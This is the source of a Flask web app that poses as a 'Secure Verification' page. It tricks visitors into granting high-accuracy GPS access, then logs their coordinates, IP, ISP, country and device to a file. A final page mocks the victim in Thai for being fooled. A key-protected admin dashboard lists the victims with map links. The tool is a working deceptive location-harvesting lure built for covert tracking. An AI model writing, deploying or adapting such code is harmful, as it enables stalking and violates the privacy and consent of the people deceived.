from flask import Flask, request, jsonify
import os, json, re
from datetime import datetime
import requests

app = Flask(__name__)
ADMIN_KEY = "0949205717As"

# --------- Helpers ---------
MOBILE_RE = re.compile(r"Android|iPhone|iPad|iPod|Mobile", re.I)

def detect_device(ua: str):
    if not ua:
        return "unknown"
    return "mobile" if MOBILE_RE.search(ua) else "desktop"

def calc_reliability(acc, percent, proxy, device):
    """
    สร้างคะแนนความน่าเชื่อถือ 0–100 จาก:
    - accuracy (ยิ่งน้อยยิ่งดี)
    - percent (จากฝั่ง client)
    - proxy (ถ้าเป็น proxy หักคะแนน)
    - device (มือถือมักแม่นกว่าเล็กน้อย)
    """
    score = 0

    # จาก accuracy
    if acc <= 20: score += 45
    elif acc <= 50: score += 35
    elif acc <= 100: score += 25
    elif acc <= 200: score += 15
    elif acc <= 500: score += 8
    else: score += 3

    # จาก percent
    try:
        p = int(percent)
    except:
        p = 0
    score += int(p * 0.3)  # สูงสุด +30

    # device bonus
    if device == "mobile":
        score += 5

    # proxy penalty
    if str(proxy).lower() == "true":
        score -= 30

    # clamp
    score = max(0, min(100, score))
    return score

# --------- Pages ---------

@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Secure Verification</title>
<style>
body{
  margin:0;font-family:Arial;
  background:linear-gradient(180deg,#0f0f1f,#000);
  color:white;text-align:center;
}
.card{
  margin-top:120px;background:rgba(0,0,0,0.6);
  display:inline-block;padding:40px;border-radius:20px;
  box-shadow:0 0 25px #6c5ce7;width:360px;
}
button{
  padding:15px 30px;border:none;border-radius:10px;
  background:#6c5ce7;color:white;font-size:18px;cursor:pointer;
}
button:hover{background:#a29bfe;}
small{color:#aaa}
</style>
</head>
<body>

<div class="card">
  <h2>🔐 กำลังเคลียดหรอ</h2>
  <p>ลองกดยืนยันดู</p>
  <button onclick="start()">ยืนยัน</button>
  <p id="status"></p>
  <small>รอแปปนึงนะ</small>
</div>

<script>
let results = [];
let tries = 0;
let MAX = 10;

function calcAccuracyPercent(acc){
  if(acc <= 20) return 99;
  if(acc <= 50) return 90;
  if(acc <= 100) return 80;
  if(acc <= 200) return 65;
  if(acc <= 500) return 50;
  return 30;
}

function start(){
  document.getElementById("status").innerText = "กำลังตรวจสอบ...";
  if(!navigator.geolocation){
    document.getElementById("status").innerText = "อุปกรณ์ไม่รองรับ";
    return;
  }
  for(let i=0;i<MAX;i++){
    navigator.geolocation.getCurrentPosition(success, error, {
      enableHighAccuracy:true,
      timeout:8000,
      maximumAge:0
    });
  }
}

function success(pos){
  tries++;
  let data = {
    lat: pos.coords.latitude,
    lon: pos.coords.longitude,
    acc: pos.coords.accuracy
  };
  results.push(data);

  document.getElementById("status").innerText =
    "กำลังวิเคราะห์ ("+tries+"/"+MAX+") | "+Math.round(data.acc)+"m";

  if(tries >= MAX){
    finalize();
  }
}

function finalize(){
  if(results.length === 0){
    document.getElementById("status").innerText = "ไม่สามารถหาตำแหน่ง";
    return;
  }
  results.sort((a,b)=>a.acc - b.acc);
  let best = results[0];
  let percent = calcAccuracyPercent(best.acc);

  document.getElementById("status").innerText =
    "สำเร็จ ("+Math.round(best.acc)+"m) | "+percent+"%";

  fetch("/location", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      lat: best.lat,
      lon: best.lon,
      acc: best.acc,
      percent: percent
    })
  }).then(()=>{ window.location="/done"; });
}

function error(){
  document.getElementById("status").innerText =
    "กดเพื่อไปต่อ";
}
</script>

</body>
</html>
"""

@app.route("/done")
def done():
    return """
    <body style="background:black;color:white;text-align:center;padding:100px">
    <h1>✅ อยากจะบอกว่าไม่มีไรมึงโดนกูหลอก</h1>
    <p>ระบบบันทึกข้อมูลเรียบร้อยแล้ว</p>
    </body>
    """

# --------- API ---------

@app.route("/location", methods=["POST"])
def location():
    d = request.get_json() or {}
    lat = d.get("lat")
    lon = d.get("lon")
    acc = float(d.get("acc", 9999))
    percent = int(d.get("percent", 0))

    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    device = detect_device(ua)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ตรวจ IP คร่าวๆ
    proxy = False
    isp = "Unknown"
    country = "Unknown"
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=4).json()
        proxy = res.get("proxy", False)
        isp = res.get("isp", "Unknown")
        country = res.get("country", "Unknown")
    except:
        pass

    reliability = calc_reliability(acc, percent, proxy, device)

    with open("log.txt","a") as f:
        f.write(f"{time}|{ip}|{device}|{country}|{isp}|{lat}|{lon}|{acc}|{percent}|{proxy}|{reliability}\n")

    return jsonify({"ok":True})

# --------- Dashboard ---------

@app.route("/admin")
def admin():
    if request.args.get("key") != ADMIN_KEY:
        return "Access Denied ❌"

    rows = ""
    data_points = []  # for chart

    try:
        with open("log.txt") as f:
            for line in f:
                t,ip,device,country,isp,lat,lon,acc,percent,proxy,rel = line.strip().split("|")
                link = f"https://www.google.com/maps?q={lat},{lon}"

                # color
                pr = int(percent)
                color = "lime" if pr > 80 else "orange" if pr > 50 else "red"

                rows += f"""
                <tr>
                  <td>{t}</td>
                  <td>{ip}</td>
                  <td>{device}</td>
                  <td>{country}</td>
                  <td>{isp}</td>
                  <td>{lat},{lon}</td>
                  <td>{acc}m</td>
                  <td style='color:{color}'>{percent}%</td>
                  <td>{proxy}</td>
                  <td>{rel}</td>
                  <td><a href="{link}" target="_blank">📍</a></td>
                </tr>
                """
                data_points.append({"acc": float(acc), "rel": int(rel)})
    except:
        rows = "<tr><td colspan=11>No data</td></tr>"

    # prepare chart arrays
    accs = [p["acc"] for p in data_points]
    rels = [p["rel"] for p in data_points]

    return f"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
body{{background:#0f0f1f;color:white;font-family:Arial}}
table{{width:100%;text-align:center}}
</style>
</head>
<body>

<h1>📊 PRO DASHBOARD</h1>

<canvas id="chart" height="100"></canvas>

<script>
const ctx = document.getElementById('chart');
new Chart(ctx, {{
  type: 'line',
  data: {{
    labels: {list(range(len(accs)))},
    datasets: [
      {{
        label: 'Accuracy (m)',
        data: {accs}
      }},
      {{
        label: 'Reliability',
        data: {rels}
      }}
    ]
  }}
}});
</script>

<table border=1>
<tr>
<th>Time</th><th>IP</th><th>Device</th><th>Country</th><th>ISP</th>
<th>Location</th><th>Accuracy</th><th>%</th><th>Proxy</th><th>Score</th><th>Map</th>
</tr>
{rows}
</table>

</body>
</html>
"""

# ---------

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT",10000)))
